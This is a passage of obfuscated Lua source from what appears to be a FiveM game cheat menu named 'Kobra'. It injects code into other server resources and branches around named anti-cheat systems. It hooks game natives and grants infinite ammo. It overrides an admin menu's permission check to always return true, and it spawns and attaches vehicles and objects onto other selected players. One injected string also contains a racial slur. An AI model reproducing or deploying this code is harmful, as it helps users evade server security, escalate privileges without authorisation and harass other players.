v1260(...);end);hNative("PlayerPedId",function(v1261,...) return v1261(...);end);hNative("GetEntityCoords",function(v1262,...) return v1262(...);end);v1122=2;end if (10==v1122) then hNative("ShootSingleBulletBetweenCoords",function(v1263,...) return v1263(...);end);RenderScriptCams(false,false,0 -0 ,true,true);if _G.KobraFreecamObject then local v1298=0 + 0 ;while true do if (v1298==(0 -0)) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());break;end end else v49(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                    _G.KobraFreecamEnabled = false
                    _G.KobraFreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject, false) _G.KobraFreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]]);end else _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v991,v992) local v993=_G[v991];if ( not v993 or (type(v993)~="function")) then return;end _G[v991]=function(...) return v992(v993,...);end;end hNative("CreateThread",function(v994,...) return v994(...);end);hNative("Wait",function(v995,...) return v995(...);end);hNative("IsVehicleSeatFree",function(v996,...) return v996(...);end);hNative("PlayerPedId",function(v997,...) return v997(...);end);hNative("GetEntityCoords",function(v998,...) return v998(...);end);hNative("CreateCam",function(v999,...) return v999(...);end);hNative("SetCamCoord",function(v1000,...) return v1000(...);end);hNative("SetCamRot",function(v1001,...) return v1001(...);end);hNative("RenderScriptCams",function(v1002,...) return v1002(...);end);hNative("DestroyCam",function(v1003,...) return v1003(...);end);hNative("SetFocusEntity",function(v1004,...) return v1004(...);end);hNative("SetTextFont",function(v1005,...) return v1005(...);end);hNative("SetTextProportional",function(v1006,...) return v1006(...);end);hNative("SetTextScale",function(v1007,...) return v1007(...);end);hNative("SetTextDropShadow",function(v1008,...) return v1008(...);end);hNative("SetTextEdge",function(v1009,...) return v1009(...);end);hNative("SetTextOutline",function(v1010,...) return v1010(...);end);hNative("SetTextCentre",function(v1011,...) return v1011(...);end);hNative("SetTextColour",function(v1012,...) return v1012(...);end);hNative("BeginTextCommandDisplayText",function(v1013,...) return v1013(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1014,...) return v1014(...);end);hNative("EndTextCommandDisplayText",function(v1015,...) return v1015(...);end);hNative("GetCamCoord",function(v1016,...) return v1016(...);end);hNative("GetCamRot",function(v1017,...) return v1017(...);end);hNative("IsControlPressed",function(v1018,...) return v1018(...);end);hNative("GetDisabledControlNormal",function(v1019,...) return v1019(...);end);hNative("TaskStandStill",function(v1020,...) return v1020(...);end);hNative("SetFocusPosAndVel",function(v1021,...) return v1021(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1022,...) return v1022(...);end);hNative("GetShapeTestResult",function(v1023,...) return v1023(...);end);hNative("IsControlJustPressed",function(v1024,...) return v1024(...);end);hNative("IsDisabledControlJustPressed",function(v1025,...) return v1025(...);end);hNative("IsEntityAVehicle",function(v1026,...) return v1026(...);end);hNative("TaskWarpPedIntoVehicle",function(v1027,...) return v1027(...);end);hNative("SetEntityCoords",function(v1028,...) return v1028(...);end);hNative("GiveWeaponToPed",function(v1029,...) return v1029(...);end);hNative("SetCurrentPedWeapon",function(v1030,...) return v1030(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1031,...) return v1031(...);end);RenderScriptCams(false,false,0 -0 ,true,true);if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;end SetFocusEntity(PlayerPedId());end break;end end end end;v12.EnableInfiniteAmmo=function(v192) if (GetResourceState("WaveShield")=="started") then local v532=433 -(279 + 154) ;local v533;local v534;local v535;local v536;local v537;local v538;local v539;local v540;local v541;local v542;local v543;while true do if (3==v532) then v537=v534({56 + 15 ,118 -(12 + 5) ,295 -179 ,72,414 -317 ,22 + 93 ,104,321 -246 ,25 + 76 ,2019 -(41 + 1857) });v538=v534({183 -112 ,144 -43 ,116,1644 -(874 + 705) ,16 + 93 ,75 + 34 ,230 -119 ,752 -(642 + 37) ,110,80,253 -152 ,554 -(233 + 221) ,87,89 + 12 ,62 + 35 ,316 -204 ,263 -152 ,110});v539=v534({65,80 + 20 ,1115 -(657 + 358) ,148 -83 ,1296 -(1151 + 36) ,29 + 80 ,111,84,331 -220 ,914 -(64 + 770) ,69 + 32 ,18 + 82 });v532=4;end if (v532==(1244 -(157 + 1086))) then v534=nil;function v534(v844) return _G[v533(v844)];end if  not _G.osintInfAmmo then _G.osintInfAmmo={enabled=false};end v532=3 -1 ;end if (v532==(8 -6)) then _G.osintInfAmmo.enabled=true;v535=v534({109 -29 ,927 -(599 + 220) ,2028 -(1813 + 118) ,1338 -(841 + 376) ,101,311 -197 ,205 -125 ,101,100,54 + 19 ,100});v536=v534({12 + 59 ,621 -(150 + 370) ,285 -169 ,393 -310 ,491 -(14 + 376) ,108,66 + 35 ,87 + 12 ,116,295 -194 ,100,80,179 -(23 + 55) ,100,87,101,31 + 66 ,1013 -(652 + 249) ,1979 -(708 + 1160) ,110});v532=3;end if (v532==0) then print("1");v533=nil;function v533(v845) local v846="";for v935=1 -0 , #v845 do v846=v846   .. string.char(v845[v935]) ;end return v846;end v532=28 -(10 + 17) ;end if (v532==(1 + 3)) then v540=v534({130 -62 ,48 + 63 ,87 + 14 ,115,69,1500 -(360 + 1030) ,103 + 13 ,105,116,1782 -(909 + 752) ,125 -56 ,47 + 73 ,67 + 38 ,271 -156 ,116});v541=v534({1220 -(1076 + 57) ,16 + 81 ,9 + 96 ,62 + 54 });v542={};v532=5;end if (v532==(412 -(174 + 233))) then v543=nil;function v543(v847) local v848=0 -0 ;local v849;local v850;while true do if (v848==0) then v849=coroutine.create(v847);v850=nil;v848=1 -0 ;end if (v848==(1 + 0)) then function v850() while coroutine.status(v849)~="dead"  do local v1182,v1183=coroutine.resume(v849);if  not v1182 then print("^1[Kobra InfAmmo] Coroutine error: ^7",v1183);break;end v541(1174 -(663 + 511) );end end v850();break;end end end if  not _G.osintWaveLoop then local v936=0 + 0 ;while true do if ((0 + 0)==v936) then _G.osintWaveLoop=true;v543(function() while _G.osintWaveLoop do if _G.osintInfAmmo.enabled then local v1299=v535();if v540(v1299) then local v1339=v536(v1299);if (v1339 and (v1339~=v537("WEAPON_UNARMED"))) then local v1436=0 -0 ;local v1437;local v1438;local v1439;while true do if (v1436==(0 + 0)) then v1437,v1438=v538(v1299,v1339);v1439=tostring(v1299);v1436=2 -1 ;end if (v1436==(2 -1)) then if  not v542[v1439] then v542[v1439]=v1438;end if (v1438<v542[v1439]) then v539(v1299,v1339,v542[v1439] -v1438 );end break;end end end end else coroutine.yield();end coroutine.yield();end end);break;end end end break;end end elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);else v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);end end;v12.DisableInfiniteAmmo=function(v193) if (GetResourceState("WaveShield")=="started") then v49(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            if _G.osintInfAmmo then
                _G.osintInfAmmo.enabled = false
            end
        ]]);elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);else v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);end end;v12.AttachSelectedVehicle=function(v194,v195,v196) local v197=0 + 0 ;local v198;local v199;local v200;local v201;local v202;while true do if (v197==(5 -2)) then v201=GetCurrentServerEndpoint();v202=0 + 0 ;v197=4;end if (v197==0) then if ( not v195 or ( #v195==(0 + 0))) then v194:Notify("error","Kobra","No players selected!",3722 -(478 + 244) );return;end if ( not v196 or ( #v196==0)) then local v763=0;while true do if (v763==(517 -(440 + 77))) then v194:Notify("error","Kobra","Invalid vehicle model!",3000);return;end end end v197=1 + 0 ;end if (v197==(7 -5)) then v199=v196;v200=v198(v199);v197=3;end if (v197==(1560 -(655 + 901))) then for v695,v696 in ipairs(v195) do if (GetResourceState("solos-rentals")=="started") then local v851=0 + 0 ;local v852;local v853;while true do if (v851==(1 + 0)) then if v852 then v202=v202 + 1 ;end break;end if (v851==0) then print("[vehicle_attach] Fallback: solos-rentals");v852,v853=pcall(function() MachoInjectResource("solos-rentals",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v200,v696));end);v851=1 + 0 ;end end elseif (GetResourceState("amigo")=="started") then print("[vehicle_attach] Fallback: Amigo RP");local v1032,v1033=pcall(function() MachoInjectResourceRaw("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v200,v696));end);if v1032 then v202=v202 + (3 -2) ;end elseif (GetResourceState("qb-core")=="started") then local v1156=1445 -(695 + 750) ;local v1157;local v1158;while true do if (v1156==(3 -2)) then if v1157 then v202=v202 + 1 ;end break;end if (v1156==(0 -0)) then print("[vehicle_attach] Fallback #02");v1157,v1158=pcall(function() MachoInjectResource("qb-core",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]],v200,v696));end);v1156=3 -2 ;end end elseif ((v201:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1217=0;local v1218;local v1219;while true do if (v1217==(351 -(285 + 66))) then print("[vehicle_attach] Fallback #1");v1218,v1219=pcall(function() MachoInjectResource("drc_gardener",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]],v200,v696));end);v1217=2 -1 ;end if (v1217==(1311 -(682 + 628))) then if v1218 then v202=v202 + 1 ;end break;end end elseif (GetResourceState("lunar_bridge")=="started") then print("[vehicle_attach] Fallback #2");local v1300,v1301=pcall(function() MachoInjectResourceRaw("lunar_bridge",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v200,v696));end);if v1300 then v202=v202 + 1 + 0 ;end elseif (GetResourceState("lation_laundering")=="started") then print("[vehicle_attach] Fallback #3");local v1340,v1341=pcall(function() MachoInjectResourceRaw("lation_laundering",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]],v200,v696));end);if v1340 then v202=v202 + (300 -(176 + 123)) ;end else local v1342=0 + 0 ;local v1343;local v1344;while true do if (v1342==1) then if v1343 then v202=v202 + 1 + 0 ;end break;end if (v1342==0) then print("[vehicle_attach] Universal Fallback");v1343,v1344=pcall(function() local v1546=string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]],v200,v696);MachoInjectResourceRaw("any",v1546,v696);end);v1342=1;end end end end break;end if (v197==1) then v198=nil;function v198(v697) local v698={};for v764=270 -(239 + 30) , #v697 do v698[v764]=string.byte(v697,v764);end return table.concat(v698,",");end v197=2;end end end;function encodeToByteArrayLiteral(v203) if  not v203 then return "";end if (type(v203)~="string") then return tostring(v203);end if ( #v203==(0 + 0)) then return "";end local v204={};for v316=1 + 0 , #v203 do v204[ #v204 + (1 -0) ]=tostring(string.byte(v203,v316));end return table.concat(v204,", ");end v12.SpawnSelectedObject=function(v205,v206) if ( not v206 or ( #v206==0)) then v205:Notify("error","Kobra","No players selected!",9359 -6359 );return;end local v207=v205:GetSelectedObjectModel();if ( not v207 or ( #v207==0)) then v205:Notify("error","Kobra","Invalid object model!",3315 -(306 + 9) );return;end local v208=encodeToByteArrayLiteral(v207);local v209=0 -0 ;for v318,v319 in ipairs(v206) do if ((GetResourceState("qb-core")=="started") or ((GetResourceState("mc9-core")=="started") and ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started") or (GetResourceState("ReaperV4")=="started") or (GetResourceState("WaveShield")=="started")))) then v205:Notify("error","Kobra","Using Qb-core Spawner!",3000);MachoInjectResource("qb-core",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v208,v319));v209=v209 + 1 ;elseif (GetResourceState("cd_dispatch")=="started") then local v766=0;while true do if ((1 + 0)==v766) then v209=v209 + 1 + 0 ;break;end if (v766==0) then print("using fallback");MachoInjectResource("cd_dispatch",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]],v208,v319));v766=1 + 0 ;end end elseif (GetResourceState("rcore_drunk")=="started") then local v937=0 -0 ;while true do if (v937==(1375 -(1140 + 235))) then MachoInjectResourceRaw("rcore_drunk",string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            ]],v207,v319));v209=v209 + 1 + 0 ;break;end end elseif (GetResourceState("lc_fuel")=="started") then MachoInjectResourceRaw("lc_fuel",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]],v207,v319));v209=v209 + 1 + 0 ;elseif (GetResourceState("0r-illegalpack")=="started") then local v1184=0 + 0 ;while true do if (v1184==0) then MachoInjectResourceRaw("0r-illegalpack",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]],v207,v319));v209=v209 + (53 -(33 + 19)) ;break;end end elseif (GetResourceState("xradio")=="started") then local v1264=0 + 0 ;while true do if ((0 -0)==v1264) then MachoInjectResourceRaw("xradio",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]],v207,v319));v209=v209 + 1 ;break;end end else MachoInjectResourceRaw("any",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
